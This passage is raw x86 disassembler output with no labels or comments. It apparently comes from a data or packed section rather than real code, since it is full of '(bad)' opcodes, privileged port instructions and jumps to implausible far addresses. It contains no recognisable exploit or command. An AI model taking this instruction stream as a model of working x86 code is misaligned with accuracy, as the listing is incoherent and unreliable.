  4103ef:	xor    eax,0xa6af1562
  4103f4:	xor    BYTE PTR [ebp-0x3a],dh
  4103f7:	adc    edi,edi
  4103f9:	sub    al,BYTE PTR [ebx+0x1d6810c]
  4103ff:	push   ecx
  410400:	stos   DWORD PTR es:[edi],eax
  410401:	add    ah,BYTE PTR [edi-0x1f2ffe38]
  410407:	in     al,0x22
  410409:	repnz xchg ecx,eax
  41040b:	jmp    0x4103e7
  41040d:	jle    0x4103ec
  41040f:	adc    BYTE PTR [esi],bl
  410411:	sti    
  410412:	mov    ch,0xee
  410414:	test   eax,0x5a635cb8
  410419:	adc    BYTE PTR [ebx+edx*1-0x4a],bl
  41041d:	inc    esp
  41041e:	jmp    0x41041c
  410420:	lock sub DWORD PTR [ecx-0x6b],eax
  410424:	or     al,0x7a
  410426:	fwait
  410427:	aam    0xcb
  410429:	cmc    
  41042a:	push   ebp
  41042b:	sub    eax,0x8bf03376
  410430:	adc    al,0xa8
  410432:	aam    0x3c
  410434:	mov    edi,DWORD PTR [ebp-0x56d117a8]
  41043a:	push   0x72bacaca
  41043f:	aad    0x1e
  410441:	pop    eax
  410442:	xor    edx,DWORD PTR [edx+0x35]
  410445:	inc    esp
  410446:	cmp    BYTE PTR [ebp+0x3b6c6b1a],0x91
  41044d:	pop    ebp
  41044e:	jno    0x410455
  410450:	sub    eax,0xff15bba4
  410455:	pop    es
  410456:	mov    cl,0x3b
  410458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410459:	fucom  st(0)
  41045b:	add    al,0x63
  41045d:	cmp    BYTE PTR [ecx-0x361ffc28],dl
  410463:	sbb    eax,0x4b60d584
  410468:	or     eax,ebp
  41046a:	add    ecx,DWORD PTR cs:[eax-0x5245e7f5]
  410471:	add    esi,DWORD PTR [esi-0x7d7e7156]
  410477:	pop    es
  410478:	ja     0x410428
  41047a:	cmc    
  41047b:	in     al,dx
  41047c:	xchg   edx,eax
  41047d:	stc    
  41047e:	add    cl,BYTE PTR [edi]
  410480:	mov    dh,0x9c
  410482:	inc    edx
  410483:	inc    ebp
  410484:	cli    
  410485:	jmp    0xe893a49c
  41048a:	sti    
  41048b:	jbe    0x41048c
  41048d:	and    al,0xe3
  41048f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410490:	aam    0xb1
  410492:	iret   
  410493:	cld    
  410494:	xor    eax,0xc218a1ae
  410499:	mov    DWORD PTR [eax-0x3a],ebp
  41049c:	ins    DWORD PTR es:[edi],dx
  41049d:	pop    ds
  41049e:	in     al,0x7f
  4104a0:	aam    0xfc
  4104a2:	lods   eax,DWORD PTR ds:[esi]
  4104a3:	xor    edx,eax
  4104a5:	in     eax,dx
  4104a6:	fidiv  DWORD PTR [eax]
  4104a8:	es mov ebx,0x24954c82
  4104ae:	bnd jp 0x410445
  4104b1:	pop    esi
  4104b2:	inc    edx
  4104b3:	inc    ebp
  4104b4:	test   DWORD PTR [ebx+0x12],edx
  4104b7:	jns    0x410519
  4104b9:	cwde   
  4104ba:	mov    ah,0xdb
  4104bc:	clc    
  4104bd:	nop
  4104be:	xchg   edi,eax
  4104bf:	imul   DWORD PTR [esi-0x8fa1156]
  4104c5:	sti    
  4104c6:	dec    esp
  4104c7:	(bad)  
  4104c8:	sbb    ecx,DWORD PTR [ecx-0x52]
  4104cb:	sub    ebx,DWORD PTR [edx-0x3e]
  4104ce:	cmp    eax,0x202ab1da
  4104d3:	push   esi
  4104d4:	addr16 jl 0x4104ad
  4104d7:	stos   BYTE PTR es:[edi],al
  4104d8:	push   esp
  4104d9:	mov    edx,0x7bae8449
  4104de:	lods   al,BYTE PTR ds:[esi]
  4104df:	mov    ecx,0xea9af220
  4104e4:	jmp    0x43035c43
  4104e9:	jno    0x41048a
  4104eb:	int    0x34
  4104ed:	imul   edx,eax,0xffffff8e
  4104f0:	jmp    DWORD PTR [ecx]
  4104f2:	mov    dl,0x1b
  4104f4:	add    DWORD PTR [edx-0x404103b7],0x63
  4104fb:	sbb    dl,ch
  4104fd:	pop    eax
  4104fe:	and    edx,DWORD PTR [edx+0x5c]
  410501:	fsubr  st(3),st
  410503:	adc    DWORD PTR [esi-0x19],eax
  410506:	fmul   QWORD PTR [edi-0x4a]
  410509:	jp     0x410533
  41050b:	rcl    DWORD PTR [edx-0x20],1
  41050e:	call   0x348fdba7
  410513:	xor    bl,0xd9
  410516:	jns    0x41055e
  410518:	inc    esp
  410519:	loopne 0x4104ba
  41051b:	add    ebx,DWORD PTR [ecx+eax*8]
  41051e:	call   DWORD PTR [esi+0xc]
  410521:	imul   esi,DWORD PTR [esi],0x3d1f4671
  410527:	xor    al,0x36
  410529:	inc    esi
  41052a:	aad    0x4c
  41052c:	push   ebx
  41052d:	pop    ebx
  41052e:	fsubr  st,st(1)
  410530:	and    al,0x28
  410532:	in     eax,dx
  410533:	cli    
  410534:	jne    0x41058f
  410536:	sub    ecx,ebx
  410538:	scas   eax,DWORD PTR es:[edi]
  410539:	fdivp  st(3),st
  41053b:	cdq    
  41053c:	int3   
  41053d:	jmp    0x41058f
  41053f:	call   0x8d19bdf4
  410544:	cmp    eax,0x18d9760c
  410549:	aad    0x9e
  41054b:	sub    eax,0xb497dee8
  410550:	and    bh,BYTE PTR [edx+0x7a]
  410553:	and    eax,0x1870fe1a
  410558:	out    0x21,eax
  41055a:	out    0x12,eax
  41055c:	sahf   
  41055d:	or     bl,bl
  41055f:	lods   eax,DWORD PTR ds:[esi]
  410560:	jl     0x410597
  410562:	cmc    
  410563:	repnz xor eax,0x82511bb0
  410569:	lea    ebx,[ebp+0x49f35b64]
  41056f:	sbb    BYTE PTR [ebx],ah
  410571:	push   ebx
  410572:	or     edi,DWORD PTR ds:0x716778be
  410578:	fadd   QWORD PTR [ebx+0x21]
  41057b:	push   ecx
  41057c:	xor    al,0x5
  41057e:	call   0x21d5:0x91a0e4cd
  410585:	mov    ecx,0xb2bbe0c3
  41058a:	inc    esi
  41058b:	sub    eax,0x3164426e
  410590:	jle    0x410518
  410592:	push   0xffffffa3
  410594:	add    edi,esi
  410596:	and    eax,0xb76f09df
  41059b:	dec    ecx
  41059c:	int    0x3f
  41059e:	fsubr  DWORD PTR [ebx+0x57]
  4105a1:	vpsllw ymm4,ymm0,XMMWORD PTR [eax]
  4105a5:	sub    al,0xcf
  4105a7:	add    BYTE PTR [edx],ah
  4105a9:	call   0x2235:0x9712c7a4
  4105b0:	out    0x9,eax
  4105b2:	push   ebp
  4105b3:	jo     0x4105e5
  4105b5:	and    edx,DWORD PTR [eax-0x6748290f]
  4105bb:	push   0x9769c69a
  4105c0:	leave  
  4105c1:	and    esp,DWORD PTR [esi+ebx*8+0x20]
  4105c5:	pop    edx
  4105c6:	out    0x1c,al
  4105c8:	and    DWORD PTR [ebx-0x87c3054],edi
  4105ce:	inc    ecx
  4105cf:	(bad)  
  4105d0:	jmp    0x41060a
  4105d2:	xchg   esp,eax
  4105d3:	fldcw  WORD PTR [edi]
  4105d5:	pop    es
  4105d6:	enter  0x1908,0x43
  4105da:	pop    edi
  4105db:	ja     0x410628
  4105dd:	sub    ecx,DWORD PTR [ebx]
  4105df:	inc    edx
  4105e0:	addr16 rcl dl,0x91
  4105e4:	mov    ebx,0xfb69e941
  4105e9:	rol    DWORD PTR [edx-0x66],1
  4105ec:	jbe    0x4105cf
  4105ee:	scas   eax,DWORD PTR es:[edi]
  4105ef:	sub    DWORD PTR [ecx],edi
  4105f1:	pop    esp
  4105f2:	pop    eax
  4105f3:	outs   dx,BYTE PTR ds:[esi]
  4105f4:	push   esi
  4105f5:	scas   al,BYTE PTR es:[edi]
  4105f6:	xchg   BYTE PTR [edx],dh
  4105f8:	cmp    al,0x8d
  4105fa:	ds jge 0x41063b
  4105fd:	lock xchg ebp,eax
  4105ff:	and    ah,bh
  410601:	sar    edx,0xd4
  410604:	retf   
  410605:	repnz fisubr DWORD PTR [esi]
  410608:	adc    BYTE PTR [edx-0x43690cbf],dl
  41060e:	cmp    al,0x7a
  410610:	ror    BYTE PTR [ecx+0x75],1
  410613:	fwait
  410614:	sub    al,0x51
  410616:	mov    ch,0x5a
  410618:	jmp    0x4c74:0xfb563cee
  41061f:	add    eax,0x801e7979
  410624:	retf   
  410625:	(bad)  
  410626:	or     cl,dl
  410628:	push   edi
  410629:	sbb    al,0x87
  41062b:	mov    cl,0xa4
  41062d:	std    
  41062e:	repz pop esi
  410630:	test   eax,0x65ae7c2a
  410635:	inc    ebp
  410636:	icebp  
  410637:	(bad)  
  410638:	and    edx,edx
  41063a:	cwde   
  41063b:	stc    
  41063c:	js     0x4106bd
  41063e:	pop    esi
  41063f:	mov    ah,bh
  410641:	xor    esi,DWORD PTR [edi]
  410643:	cmp    dl,0x88
  410646:	push   edi
  410647:	and    eax,0x6148b5ac
  41064c:	jecxz  0x4105f6
  41064e:	sbb    eax,0x1f2577eb
  410653:	sbb    BYTE PTR [esi+ebx*2-0x79],bh
  410657:	push   eax
  410658:	adc    BYTE PTR [ecx-0x12],al
  41065b:	pop    ss
  41065c:	test   al,0xeb
  41065e:	or     BYTE PTR [esi+ecx*4],bh
  410661:	mov    esp,0x297a5ff5
  410666:	push   cs
  410667:	mov    dh,0x70
  410669:	in     al,0x3a
  41066b:	mov    bh,0xd4
  41066d:	mov    ecx,0x7b32b1c6
  410672:	mov    al,ds:0x4906fb53
  410677:	neg    BYTE PTR [ebp+0x1b90f966]
  41067d:	add    eax,0xf4d55937
  410682:	push   ds
  410683:	add    DWORD PTR [eax-0x31fb36ca],ebp
  410689:	add    eax,0x6dfda6cc
  41068e:	rcl    BYTE PTR gs:[esp+edi*1-0x179ba9d2],1
  410696:	jecxz  0x4106d8
  410698:	sub    eax,0xb0d434af
  41069d:	loope  0x41062f
  41069f:	mov    edx,0xb672860
  4106a4:	mov    edi,0xe28a508f
  4106a9:	jle    0x41070c
  4106ab:	xchg   edi,eax
  4106ac:	in     eax,dx
  4106ad:	xor    eax,0x3976c8d3
  4106b2:	sub    BYTE PTR [edi-0x20],dl
  4106b5:	jl     0x41065a
  4106b7:	nop
  4106b8:	xchg   ecx,eax
  4106b9:	xchg   esp,eax
  4106ba:	ror    BYTE PTR [ebp+0x2ee421],cl
  4106c0:	pusha  
  4106c1:	cmc    
  4106c2:	sbb    DWORD PTR [ecx],0x1f
  4106c5:	jbe    0x410647
  4106c7:	xor    eax,0x82fdb822
  4106cc:	add    DWORD PTR [eax],esi
  4106ce:	dec    edi
  4106cf:	loopne 0x410717
  4106d1:	mov    dh,0x4a
  4106d3:	fldcw  WORD PTR [ecx-0x11]
  4106d6:	retf   
  4106d7:	clc    
  4106d8:	test   BYTE PTR [eax-0x28],al
  4106db:	arpl   WORD PTR [ebp+0x37],bp
  4106de:	mov    ds:0x7ca4cce7,eax
  4106e3:	jmp    0x4106fe
  4106e5:	pop    ecx
  4106e6:	ret    
  4106e7:	div    DWORD PTR [esi+0x13e32aba]
  4106ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106ee:	cld    
  4106ef:	sbb    bh,BYTE PTR [edx]
  4106f1:	xchg   edi,eax
  4106f2:	push   esp
  4106f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106f4:	push   esi
  4106f5:	ret    
  4106f6:	mov    DWORD PTR [edx-0x12529f20],ecx
  4106fc:	hlt    
  4106fd:	dec    edx
  4106fe:	pop    ecx
  4106ff:	sbb    eax,0x7962a01f
  410704:	retf   0xb3d8
  410707:	jns    0x41070b
  410709:	xor    cl,BYTE PTR [ebx+0x7c41068d]
  41070f:	push   ss
  410710:	push   eax
  410711:	xor    esp,DWORD PTR [ecx+0x69]
  410714:	sbb    eax,0x8a8ecbf1
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebx
  41071b:	mov    edx,0x19871d3b
  410720:	imul   ebp,eax,0xcb9267ce
  410726:	bound  edx,QWORD PTR [esi+edi*4]
  410729:	mov    al,0x3b
  41072b:	lods   eax,DWORD PTR cs:[esi]
  41072d:	add    ebp,DWORD PTR [edi-0x5cf15d0]
  410733:	inc    esi
  410734:	aam    0xe2
  410736:	test   eax,0xabadc49b
  41073b:	mov    esi,DWORD PTR [edi-0xf]
  41073e:	hlt    
  41073f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410740:	cmc    
  410741:	cmp    bx,WORD PTR [eax-0x71]
  410745:	imul   DWORD PTR [edx-0x1]
  410748:	daa    
  410749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41074a:	(bad)  
  41074b:	lea    esi,[edi+ebx*4+0x70]
  41074f:	cdq    
  410750:	stc    
  410751:	push   0x4f148554
  410756:	pop    edi
  410757:	sub    ebp,DWORD PTR [eax+0x3c6020f2]
  41075d:	xor    al,bh
  41075f:	cli    
  410760:	adc    ecx,DWORD PTR [ebx+edx*4+0x1156915]
  410767:	data16 (bad) 
  41076b:	xor    eax,0x5ee5f7a1
  410770:	pop    edx
  410771:	jp     0x41077c
  410773:	xor    al,0xe6
  410775:	xor    BYTE PTR [ecx-0x4279d3d4],ah
  41077b:	mov    WORD PTR [edi+0x48601e3b],?
  410781:	jg     0x410755
  410783:	addr16 call 0x5885:0xf1902797
  41078b:	leave  
  41078c:	add    BYTE PTR [eax+0x1a3a1864],0xc1
  410793:	fdivr  st,st(3)
  410795:	sbb    DWORD PTR [edx+0x378a7c8],ebx
  41079b:	sub    eax,0x31caf7e5
  4107a0:	mov    cl,0x28
  4107a2:	outs   dx,BYTE PTR ds:[esi]
  4107a3:	mov    bh,0x75
  4107a5:	ret    0x2967
  4107a8:	loopne 0x4107a6
  4107aa:	ret    
  4107ab:	or     bh,dl
  4107ad:	jge    0x410744
  4107af:	adc    DWORD PTR [ebx-0x9],edx
  4107b2:	and    eax,0xe542249
  4107b7:	dec    edi
  4107b8:	popa   
  4107b9:	hlt    
  4107ba:	imul   esi,DWORD PTR [ebx],0x690402d1
  4107c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107c1:	shr    DWORD PTR [esi-0x1bd204b3],0x99
  4107c8:	and    ah,BYTE PTR [ecx+0x6e]
  4107cb:	popa   
  4107cc:	rcl    DWORD PTR [ebx],1
  4107ce:	add    BYTE PTR cs:[eax+0xe],al
  4107d2:	imul   ebx,eax,0xfb167138
  4107d8:	aaa    
  4107d9:	rol    bh,1
  4107db:	(bad)  
  4107dc:	popa   
  4107dd:	xchg   esi,eax
  4107de:	inc    esp
  4107df:	stos   BYTE PTR es:[edi],al
  4107e0:	mov    esi,DWORD PTR [eax+0x11]
  4107e3:	mov    eax,ds:0x1ede5876
  4107e8:	sub    ebx,DWORD PTR [esi-0x65f3086b]
  4107ee:	scas   al,BYTE PTR es:[edi]
  4107ef:	mov    ecx,edi
  4107f1:	mov    DWORD PTR [edx+edi*2+0x21],ebx
  4107f5:	fiadd  WORD PTR ds:0x8d77839
  4107fb:	ins    BYTE PTR es:[edi],dx
  4107fc:	push   eax
  4107fd:	push   edx
  4107fe:	xor    DWORD PTR [esp+eiz*4-0x117e678f],ecx
  410805:	add    BYTE PTR [eax-0x64],cl
  410808:	pop    esi
  410809:	push   ebp
  41080a:	xlat   BYTE PTR ds:[ebx]
  41080b:	in     eax,dx
  41080c:	shl    ecx,0x68
  41080f:	repnz aas 
  410811:	lds    edi,FWORD PTR [edx+eiz*4]
  410814:	xchg   esp,eax
  410815:	mov    eax,ds:0x9d19cc35
  41081a:	fs enter 0x495a,0xe1
  41081f:	xchg   ebx,eax
  410820:	dec    BYTE PTR [esi]
  410822:	mov    dh,0x13
  410824:	push   ss
  410825:	sbb    BYTE PTR [ebx],al
  410827:	cmc    
  410828:	fs out 0x90,eax
  41082b:	dec    ebp
  41082c:	fcomp  DWORD PTR [esi+0x204e4a34]
  410832:	stc    
  410833:	mov    edx,0x44fcc305
  410838:	push   0x59deaf0b
  41083d:	xchg   ebp,eax
  41083e:	add    al,0xba
  410840:	mov    ds:0x20ccf388,al
  410845:	ss dec eax
  410847:	shr    DWORD PTR [ebx-0x20],1
  41084a:	push   es
  41084b:	xor    al,0x5b
  41084d:	clc    
  41084e:	rcr    DWORD PTR [edi+ecx*2+0x1b],cl
  410852:	rol    DWORD PTR [edx+0x70],cl
  410855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410856:	jb     0x410814
  410858:	mov    bh,0x36
  41085a:	imul   edx,eax,0xfcf47b00
  410860:	in     al,dx
  410861:	fst    QWORD PTR ds:0xfe172798
  410867:	jns    0x4107ed
  410869:	mov    ebx,0x34ac2423
  41086e:	ins    BYTE PTR es:[edi],dx
  41086f:	and    DWORD PTR [ecx+0x60e5e21e],0x96d26230
  410879:	lock adc al,0xc9
  41087c:	inc    esp
  41087d:	leave  
  41087e:	mov    esi,0x9a210fe0
  410883:	jo     0x410807
  410885:	push   eax
  410886:	dec    edx
  410887:	arpl   WORD PTR [edx-0x2b],cx
  41088a:	push   0x78
  41088c:	add    BYTE PTR [esi],ah
  41088e:	lea    ebp,[ebp-0x31bf3f5b]
  410894:	xchg   esp,eax
  410895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410896:	sbb    esi,DWORD PTR [eax]
  410898:	mov    eax,0x6e786ddb
  41089d:	bound  ecx,QWORD PTR [eax]
  41089f:	add    ah,BYTE PTR [esi+0x3a76a8a8]
  4108a5:	stc    
  4108a6:	les    esi,FWORD PTR [edi+0x47b0da2b]
  4108ac:	xor    DWORD PTR [esi],ebp
  4108ae:	sbb    bh,BYTE PTR [ebx+edi*4+0x4c6e9c5c]
  4108b5:	or     al,0xd6
  4108b7:	mov    dh,0x55
  4108b9:	xchg   BYTE PTR [edx-0x7799103e],cl
  4108bf:	je     0x4108bb
  4108c1:	fdivp  st(5),st
  4108c3:	jle    0x410887
  4108c5:	jecxz  0x4108b3
  4108c7:	or     BYTE PTR ds:0xe431680a,dl
  4108cd:	and    edi,DWORD PTR [esi-0x65]
  4108d0:	xchg   ecx,eax
  4108d1:	not    BYTE PTR [edx]
  4108d3:	test   al,0xff
  4108d5:	jmp    0xabf63d65
  4108da:	adc    eax,0x4f750274
  4108df:	ror    al,0xac
  4108e2:	stos   BYTE PTR es:[edi],al
  4108e3:	xor    al,0xda
  4108e5:	dec    eax
  4108e6:	data16 (bad) [ebx+0x2b25a77f]
  4108ed:	mov    edi,0xe59f44f3
  4108f2:	call   0x6112:0x2afceeb0
  4108f9:	clc    
  4108fa:	mov    edi,0x1e7f48c0
  4108ff:	inc    ax
  410901:	adc    bh,BYTE PTR [edx-0x3d]
  410904:	push   es
  410905:	rcl    BYTE PTR [ecx+0x487b041b],1
  41090b:	nop
  41090c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41090d:	call   0x80c4:0xd840b84
  410914:	sbb    al,0x20
  410916:	fcmovbe st,st(0)
  410918:	jmp    0x410964
  41091a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41091b:	mov    al,ds:0xf5b0aad2
  410920:	ins    DWORD PTR es:[edi],dx
  410921:	fist   WORD PTR [ebx+0x4fd468e6]
  410927:	sbb    edx,DWORD PTR [edx+eiz*2]
  41092a:	les    eax,FWORD PTR [eax+eax*8]
  41092d:	ins    BYTE PTR es:[edi],dx
  41092e:	jg     0x41092c
  410930:	and    cl,bh
  410932:	adc    BYTE PTR [edi],ah
  410934:	inc    eax
  410935:	mov    ds:0x21ed2f57,eax
  41093a:	adc    BYTE PTR [edi+0x46],bl
  41093d:	rol    DWORD PTR [esi+eiz*1+0x8734e],cl
  410944:	xor    esi,DWORD PTR [ecx+0x15590263]
  41094a:	cmp    esp,0x1e1621b9
  410950:	mov    bl,0x6a
  410952:	pop    eax
  410953:	lea    esi,[ecx+0x6d4d0a75]
  410959:	xor    al,0x7a
  41095b:	pop    ebp
  41095c:	lods   al,BYTE PTR ds:[esi]
  41095d:	sar    bl,0x39
  410960:	leave  
  410961:	std    
  410962:	inc    ebx
  410963:	dec    ebx
  410964:	lea    eax,ds:0x528c18d4
  41096a:	imul   esp,esi,0x66
  41096d:	push   esi
  41096e:	sti    
  41096f:	mov    ecx,ecx
  410971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410972:	or     bh,BYTE PTR [ecx]
  410974:	sbb    dl,BYTE PTR [edi]
  410976:	sar    esp,0x5a
  410979:	(bad)  
  41097a:	mov    DWORD PTR [esi],ebp
  41097c:	lea    edi,[esi+eax*1-0x2f]
  410980:	out    0x49,al
  410982:	xor    DWORD PTR [edx-0x4b8f4859],0x44
  410989:	pusha  
  41098a:	js     0x410957
  41098c:	int3   
  41098d:	icebp  
  41098e:	(bad)  
  41098f:	fnstenv [edi-0x258bdda9]
  410995:	dec    ecx
  410996:	mov    dh,0xf
  410998:	adc    edx,DWORD PTR [edx+0x54]
  41099b:	popf   
  41099c:	pop    ss
  41099d:	test   BYTE PTR [edi-0x57],bh
  4109a0:	dec    ecx
  4109a1:	add    DWORD PTR [edx+0xf],esi
  4109a4:	lds    edi,FWORD PTR [ebx]
  4109a6:	cld    
  4109a7:	je     0x41093e
  4109a9:	sahf   
  4109aa:	les    edi,FWORD PTR [ebx-0x40]
  4109ad:	and    edi,0xaed87d31
  4109b3:	inc    edi
  4109b4:	jns    0x410963
  4109b6:	nop
  4109b7:	fisttp QWORD PTR [eax+0x247e4bad]
  4109bd:	jne    0x410961
  4109bf:	(bad)  [eax-0x7cdbd58]
  4109c5:	push   es
  4109c6:	arpl   WORD PTR [edx+ebx*8+0x28a9f373],bp
  4109cd:	xchg   ebp,eax
  4109ce:	mov    cl,BYTE PTR [ebp-0x7b89d03b]
  4109d4:	std    
  4109d5:	cmp    ebp,DWORD PTR [ecx+0x69]
  4109d8:	mov    BYTE PTR [ebx+0x7f],0xa
  4109dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109dd:	adc    BYTE PTR [ebx],ah
  4109df:	in     al,dx
  4109e0:	cmp    al,0x31
  4109e2:	(bad)  
  4109e3:	xor    BYTE PTR [ebx-0x5e],0x79
  4109e7:	stos   BYTE PTR es:[edi],al
  4109e8:	jg     0x410a53
  4109ea:	nop
  4109eb:	xor    eax,0x6a9762bd
  4109f0:	mov    dh,0xbe
  4109f2:	add    DWORD PTR [edx-0x50],edi
  4109f5:	xchg   edi,eax
  4109f6:	lods   al,BYTE PTR ds:[esi]
  4109f7:	pop    esp
  4109f8:	push   esi
  4109f9:	jl     0x4109ed
  4109fb:	push   ss
  4109fc:	call   0x55c98993
  410a01:	lea    ecx,[esi]
  410a03:	stos   BYTE PTR es:[edi],al
  410a04:	mov    gs,esp
  410a06:	adc    ecx,DWORD PTR [eax-0x63]
  410a09:	sub    eax,0x2df8b83e
  410a0e:	xchg   edx,eax
  410a0f:	dec    esi
  410a10:	sub    BYTE PTR [esi+0xd571a79],bl
  410a16:	(bad)  
  410a17:	out    dx,al
  410a18:	and    al,BYTE PTR [edi]
  410a1a:	sub    al,0x21
  410a1c:	out    dx,al
  410a1d:	ret    
  410a1e:	xchg   ebx,eax
  410a1f:	inc    ebx
  410a20:	repnz ins BYTE PTR es:[edi],dx
  410a22:	pusha  
  410a23:	cmc    
  410a24:	push   esi
  410a25:	push   es
  410a26:	cwde   
  410a27:	pop    es
  410a28:	shr    BYTE PTR [edx-0x47],cl
  410a2b:	stos   BYTE PTR es:[edi],al
  410a2c:	inc    ebp
  410a2d:	sbb    BYTE PTR [eax+ebx*4-0x7b],cl
  410a31:	pusha  
  410a32:	jno    0x410a32
  410a34:	mov    ebx,0x97aea8fd
  410a39:	(bad)  
  410a3a:	enter  0xa0ca,0x71
  410a3e:	add    DWORD PTR [ecx+0x6a],esp
  410a41:	add    eax,0x136ab07c
  410a46:	mul    DWORD PTR ds:0xd16e0221
  410a4c:	push   edi
  410a4d:	loopne 0x410a30
  410a4f:	jbe    0x410a5e
  410a51:	call   0x8d17:0x3a4475d9
  410a58:	addr16 cdq 
  410a5a:	sti    
  410a5b:	pop    ecx
  410a5c:	call   0x3002f7b9
  410a61:	icebp  
  410a62:	dec    ecx
  410a63:	mov    ch,0x70
  410a65:	inc    BYTE PTR [edx]
  410a67:	and    DWORD PTR ds:0x44fe0713,ecx
  410a6d:	outs   dx,DWORD PTR ds:[esi]
  410a6e:	inc    esi
  410a6f:	loop   0x410ad8
  410a71:	pop    esi
  410a72:	imul   esi,DWORD PTR [eax+esi*8+0x71e1ab70],0xffffffc3
  410a7a:	pop    edi
  410a7b:	mov    ecx,0x4ccb5e9d
  410a80:	push   ebx
  410a81:	adc    eax,DWORD PTR ds:0x8a1a40e0
  410a87:	(bad)  
  410a89:	(bad)  
  410a8a:	fsubr  DWORD PTR [ebp+ebx*1+0x5b]
  410a8e:	cmp    DWORD PTR [ebx-0xf],edi
  410a91:	inc    esp
  410a92:	je     0x410aa6
  410a94:	xor    DWORD PTR [edi+0x43],esi
  410a97:	jge    0x410a2e
  410a99:	and    al,0xc2
  410a9b:	mov    bl,0x30
  410a9d:	daa    
  410a9e:	adc    al,0x85
  410aa0:	add    bh,bh
  410aa2:	cld    
  410aa3:	xchg   ecx,eax
  410aa4:	rcr    esp,0xff
  410aa7:	test   BYTE PTR [ebx],ch
  410aa9:	repz in eax,0x4c
  410aac:	cmc    
  410aad:	mov    dh,0x98
  410aaf:	cli    
  410ab0:	dec    ecx
  410ab1:	stos   DWORD PTR es:[edi],eax
  410ab2:	mov    bl,0x88
  410ab4:	add    eax,0x40a76b01
  410ab9:	pop    ecx
  410aba:	nop
  410abb:	leave  
  410abc:	mov    bh,0x69
  410abe:	adc    eax,0x9ff9d5ae
  410ac3:	and    bh,bl
  410ac5:	xchg   edi,eax
  410ac6:	mov    bl,0x5d
  410ac8:	and    DWORD PTR [edx],ebx
  410aca:	fmul   QWORD PTR [edx]
  410acc:	push   esi
  410acd:	mul    DWORD PTR [ecx]
  410acf:	out    dx,al
  410ad0:	add    BYTE PTR [eax+edi*8],bl
  410ad3:	not    cl
  410ad5:	and    ch,al
  410ad7:	sti    
  410ad8:	or     eax,0xa973ac97
  410add:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ade:	sub    BYTE PTR [ebx],dl
  410ae0:	mov    esi,0xf19138d
  410ae5:	in     al,0x6
  410ae7:	push   es
  410ae8:	sub    edi,DWORD PTR [esi+edi*8]
  410aeb:	aam    0x2
  410aed:	mov    edi,0x397a8f39
  410af2:	mov    edx,0x808606ef
  410af7:	imul   ebp,DWORD PTR [ecx+0x50],0x6f
  410afb:	inc    esi
  410afc:	cmp    ecx,esi
  410afe:	test   DWORD PTR [esp+edi*1],eax
  410b01:	aam    0x38
  410b03:	dec    ebx
  410b04:	out    dx,al
  410b05:	or     al,0x8c
  410b07:	inc    edi
  410b08:	enter  0xac5b,0x42
  410b0c:	mov    eax,0x211f1999
  410b11:	int    0xc5
  410b13:	mov    ?,esp
  410b15:	add    BYTE PTR [ecx+0x51],ch
  410b18:	xchg   BYTE PTR [eax+0x31fcdad],dl
  410b1e:	jae    0x410b80
  410b20:	loope  0x410aae
  410b22:	lahf   
  410b23:	mov    dh,0x5d
  410b25:	xchg   esi,eax
  410b26:	pop    ecx
  410b27:	lds    ebp,FWORD PTR [ecx-0x404ce194]
  410b2d:	fwait
  410b2e:	sahf   
  410b2f:	xchg   ecx,eax
  410b30:	inc    esi
  410b31:	jmp    FWORD PTR [esi-0x3d]
  410b34:	fs js  0x410b42
  410b37:	std    
  410b38:	repnz rcl DWORD PTR [esi],cl
  410b3b:	push   0xffffffe4
  410b3d:	push   ebx
  410b3e:	push   cs
  410b3f:	in     al,0xf5
  410b41:	mov    bh,0xd2
  410b43:	xor    eax,0x74fccf34
  410b48:	or     esi,0x75
  410b4b:	add    eax,0x97f7fa91
  410b50:	(bad)  
  410b51:	addr16 mov esi,0xe5d71712
  410b57:	jae    0x410ae8
  410b59:	mov    edi,0x76872478
  410b5e:	icebp  
  410b5f:	xchg   edi,eax
  410b60:	or     ebp,DWORD PTR [edx]
  410b62:	pcmpeqd mm2,mm7
  410b65:	ficom  DWORD PTR [edx+0x34]
  410b68:	and    eax,0x95c09fe5
  410b6d:	pop    fs
  410b6f:	sub    dl,BYTE PTR [ebp+ecx*2+0x17f2a754]
  410b76:	stc    
  410b77:	xchg   edi,eax
  410b78:	hlt    
  410b79:	inc    ecx
  410b7a:	ffreep st(3)
  410b7c:	push   ecx
  410b7d:	mov    ah,0xb0
  410b7f:	out    0xfa,eax
  410b81:	add    BYTE PTR [edi+0x2e8876ed],bl
  410b87:	or     eax,0xbfb63c9f
  410b8c:	mov    dh,BYTE PTR [ebx-0x49]
  410b8f:	mov    WORD PTR [ebx+esi*8-0x6293d7bc],ss
  410b96:	sub    dl,BYTE PTR [ebp+0x46]
  410b99:	je     0x410bb8
  410b9b:	call   0x61d9:0x14e7c504
  410ba2:	pop    es
  410ba3:	js     0x410c06
  410ba5:	fnstenv [esp+edi*2-0x73f4e7e5]
  410bac:	mov    dh,0x9c
  410bae:	stc    
  410baf:	rol    bl,cl
  410bb1:	repz inc ebp
  410bb3:	push   eax
  410bb4:	jo     0x410bd7
  410bb6:	push   esp
  410bb7:	test   al,0xe7
  410bb9:	ins    DWORD PTR es:[edi],dx
  410bba:	mov    fs,WORD PTR [esi-0x6418d6c8]
  410bc0:	xchg   edi,eax
  410bc1:	jae    0x410ba2
  410bc3:	push   cs
  410bc4:	ins    DWORD PTR es:[edi],dx
  410bc5:	js     0x410b6d
  410bc7:	pop    ebx
  410bc8:	jno    0x410bfd
  410bca:	outs   dx,DWORD PTR ds:[esi]
  410bcb:	push   edi
  410bcc:	sti    
  410bcd:	xchg   esp,eax
  410bce:	and    al,0xa3
  410bd0:	mov    ah,bl
  410bd2:	std    
